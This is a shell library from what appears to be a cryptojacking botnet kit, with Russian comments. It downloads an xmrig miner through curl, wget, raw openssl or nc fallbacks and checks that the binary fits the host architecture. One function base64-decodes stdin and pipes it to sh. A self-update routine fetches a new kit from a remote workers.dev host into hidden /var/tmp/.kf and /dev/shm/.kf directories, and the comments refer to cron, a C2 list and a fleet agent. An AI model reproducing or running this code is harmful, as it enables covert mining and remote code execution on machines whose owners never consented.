#!/bin/sh
# 70-fetch.sh — доставка бинаря: curl → wget → openssl s_client (их http_get),
# список зеркал, проверка ELF под нужную архитектуру (их _is_elf_for_arch).
# Зависит от 00-common.sh.

# один GET в stdout; 0 — успех
kf_http_get() {
  _g_url="$1"
  if command -v curl >/dev/null 2>&1; then
    curl -fsSL -m 180 "$_g_url" 2>/dev/null && return 0
  fi
  if command -v wget >/dev/null 2>&1; then
    wget -q -T 180 -O - "$_g_url" 2>/dev/null && return 0
  fi
  if command -v openssl >/dev/null 2>&1; then
    _g_hp="${_g_url#https://}"; _g_hp="${_g_hp#http://}"
    _g_host="${_g_hp%%/*}"; _g_path="/${_g_hp#*/}"
    [ "$_g_host" = "$_g_hp" ] && _g_path="/"
    _g_ip=$(getent ahostsv4 "$_g_host" 2>/dev/null | awk '{print $1; exit}')
    [ -n "$_g_ip" ] || _g_ip="$_g_host"
    { printf 'GET %s HTTP/1.0\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\nConnection: close\r\n\r\n' "$_g_path" "$_g_host"; } \
      | timeout 60 openssl s_client -connect "${_g_ip}:443" -servername "$_g_host" -quiet 2>/dev/null \
      | tr -d '\r' | sed '1,/^$/d' && return 0
  fi
  if command -v nc >/dev/null 2>&1; then
    _g_hp="${_g_url#http://}"
    _g_host="${_g_hp%%/*}"; _g_path="/${_g_hp#*/}"
    printf 'GET %s HTTP/1.0\r\nHost: %s\r\nConnection: close\r\n\r\n' "$_g_path" "$_g_host" \
      | nc "$_g_host" 80 2>/dev/null | sed '1,/^\r*$/d' && return 0
  fi
  return 1
}

# скачать в файл, проверив ELF под архитектуру
kf_fetch_miner() {
  _f_out="$1"; shift
  _f_arch="$1"; _f_machine="$2"; shift 2
  for _f_url in "$@"; do
    [ -n "$_f_url" ] || continue
    _f_expect=$(kf_remote_len "$_f_url")
    kf_log "fetch: $_f_url${_f_expect:+ ($_f_expect байт)}"
    kf_fetch_file "$_f_url" "$_f_out.part" 2>/dev/null
    # архив с github-релизом: внутри каталог с xmrig
    case "$_f_url" in
      *.tar.gz|*.tgz)
        _f_tmp="${_f_out%/*}/.unp"
        rm -rf "$_f_tmp"; mkdir -p "$_f_tmp"
        if [ -s "$_f_out.part" ] && tar xzf "$_f_out.part" -C "$_f_tmp" 2>/dev/null; then
          _f_bin=$(find "$_f_tmp" -maxdepth 2 -type f -name xmrig 2>/dev/null | head -1)
          [ -n "$_f_bin" ] && cp -f "$_f_bin" "$_f_out.part" 2>/dev/null
        fi
        rm -rf "$_f_tmp" ;;
    esac
    if [ -s "$_f_out.part" ] && kf_is_elf_for_arch "$_f_out.part" "$_f_machine"; then
      mv -f "$_f_out.part" "$_f_out" 2>/dev/null
      chmod 700 "$_f_out" 2>/dev/null
      kf_log "fetch: ok ($(wc -c < "$_f_out") байт)"
      return 0
    fi
    kf_log "fetch: отбраковано (не ELF $_f_arch или пусто)"
    rm -f "$_f_out.part" 2>/dev/null
  done
  return 1
}

# размер по HTTP HEAD (их _remote_len)
kf_remote_len() {
  _l_url="$1"
  command -v curl >/dev/null 2>&1 || return 1
  curl -fsSLI -m 30 "$_l_url" 2>/dev/null | awk 'tolower($1)=="content-length:"{print $2}' | tr -d '\r' | tail -1
}

# --- 4. скачивание с дозагрузкой (их fetch_file 1:1) -----------------------
kf_fetch_file() {
  _ff_url="${1:-}"; _ff_out="${2:-}"
  [ -n "$_ff_url" ] && [ -n "$_ff_out" ] || return 2
  _ff_try=0
  while [ "$_ff_try" -lt 4 ]; do
    _ff_try=$((_ff_try+1)); _ff_ok=0
    if command -v curl >/dev/null 2>&1; then
      if [ -s "$_ff_out" ]; then
        kf_tool curl -fLk --silent --show-error -A Mozilla/5.0 --connect-timeout 10 --max-time 180 \
          --retry 2 --retry-delay 2 -C - --output "$_ff_out" "$_ff_url" 2>/dev/null
      else
        kf_tool curl -fLk --silent --show-error -A Mozilla/5.0 --connect-timeout 10 --max-time 180 \
          --retry 2 --retry-delay 2 --output "$_ff_out" "$_ff_url" 2>/dev/null
      fi
      [ -s "$_ff_out" ] && _ff_ok=1
    elif command -v wget >/dev/null 2>&1; then
      kf_tool wget -q -U Mozilla/5.0 --timeout=15 --tries=3 -c -O "$_ff_out" "$_ff_url" 2>/dev/null
      [ -s "$_ff_out" ] && _ff_ok=1
    fi
    if [ "$_ff_ok" != "1" ]; then
      rm -f "$_ff_out" 2>/dev/null
      kf_http_get "$_ff_url" > "$_ff_out" 2>/dev/null
      [ -s "$_ff_out" ] && _ff_ok=1
    fi
    _ff_el=$(kf_remote_len "$_ff_url")
    _ff_dl=$(wc -c < "$_ff_out" 2>/dev/null || echo 0)
    if [ -z "$_ff_el" ] || [ "$_ff_el" -le 0 ] 2>/dev/null; then
      [ "$_ff_ok" = "1" ] && return 0
    elif [ "$_ff_dl" -ge "$_ff_el" ] 2>/dev/null; then
      return 0
    else
      kf_log "дозагрузка ($_ff_dl/$_ff_el байт), попытка $_ff_try/4"
      [ "$_ff_ok" = "0" ] && [ "$_ff_try" -ge 2 ] && break
    fi
  done
  [ -s "$_ff_out" ]
}

# --- 5. исполнение base64-пейлоада из stdin (их run_gated) ------------------
kf_run_gated() {
  _rg_b=$(cat | tr -d '\r')
  printf '%s' "$_rg_b" | grep -qE '^[A-Za-z0-9+/=]+$' || return 9
  printf '%s' "$_rg_b" | base64 -d 2>/dev/null | sh
}

# --- 6. самообновление кита с носителя --------------------------------------
# cron тянет agent.sh, но библиотеки лежат в kit.tgz. Здесь агент сам сверяет
# версию и обновляет код, не трогая c.json/id/c2list/.inst/xmrig.
# Подмена через rename: работающий sh продолжает читать старый inode.
kf_self_update() {
  _su_ver_url="${KF_KIT_VER_URL:-https://edge-static.cdn-edge-e9d.workers.dev/kit.ver}"
  _su_kit_url="${KF_KIT_URL:-https://edge-static.cdn-edge-e9d.workers.dev/kit.tgz}"
  _su_v=$(kf_http_get "$_su_ver_url" 2>/dev/null | tr -d '\r\n ' | head -c 64)
  [ -n "$_su_v" ] || return 0
  [ "$_su_v" = "$(cat "$D/.kit.ver" 2>/dev/null)" ] && return 0

  _su_t="$D/.upd.$$"
  rm -rf "$_su_t" 2>/dev/null
  mkdir -p "$_su_t" 2>/dev/null || return 0
  if ! kf_fetch_file "$_su_kit_url" "$_su_t/k.tgz" 2>/dev/null; then
    rm -rf "$_su_t" 2>/dev/null
    return 0
  fi
  tar xzf "$_su_t/k.tgz" -C "$_su_t" 2>/dev/null || { rm -rf "$_su_t" 2>/dev/null; return 0; }
  if [ ! -f "$_su_t/fleet-agent.sh" ] || [ ! -f "$_su_t/lib/00-common.sh" ]; then
    rm -rf "$_su_t" 2>/dev/null
    return 0
  fi

  _su_total=0
  for _su_f in "$_su_t/fleet-agent.sh" "$_su_t/wd.sh" "$_su_t"/lib/*.sh; do
    [ -f "$_su_f" ] || continue
    _su_total=$((_su_total + 1))
  done
  [ "$_su_total" -gt 0 ] || { rm -rf "$_su_t" 2>/dev/null; return 0; }
  # Сначала проверяем весь кит. Ни один файл не заменяется при битом наборе.
  for _su_f in "$_su_t/fleet-agent.sh" "$_su_t/wd.sh" "$_su_t"/lib/*.sh; do
    [ -f "$_su_f" ] || continue
    sh -n "$_su_f" 2>/dev/null || { rm -rf "$_su_t" 2>/dev/null; return 0; }
  done
  _su_n=0
  for _su_f in "$_su_t/fleet-agent.sh" "$_su_t/wd.sh" "$_su_t"/lib/*.sh; do
    [ -f "$_su_f" ] || continue
    _su_b=${_su_f##*/}
    cp -f "$_su_f" "$D/.new.$_su_b" 2>/dev/null || continue
    chmod 700 "$D/.new.$_su_b" 2>/dev/null
    # После update D может быть /data/.kf или custom KF_D: нормализуем заново.
    sed -i "s|/var/tmp/\\.kf|$D|g; s|/dev/shm/\\.kf|$S|g" "$D/.new.$_su_b" 2>/dev/null
    mv -f "$D/.new.$_su_b" "$D/$_su_b" 2>/dev/null && _su_n=$((_su_n + 1))
  done
  if [ "$_su_n" -eq "$_su_total" ]; then
    kf_put "$D/.kit.ver" "$_su_v"
    kf_log "self-update: кит $_su_v ($_su_n файлов)"
  else
    kf_log "self-update: обновлено $_su_n/$_su_total — версия не меняем, повторим"
  fi
  if [ -d "$S" ]; then
    for _su_f in "$D"/*.sh; do
      [ -f "$_su_f" ] || continue
      _su_b=${_su_f##*/}
      cp -f "$_su_f" "$S/$_su_b" 2>/dev/null
    done
    [ "$_su_n" -eq "$_su_total" ] && cp -f "$D/.kit.ver" "$S/.kit.ver" 2>/dev/null
  fi
  rm -rf "$_su_t" 2>/dev/null
  return 0
}
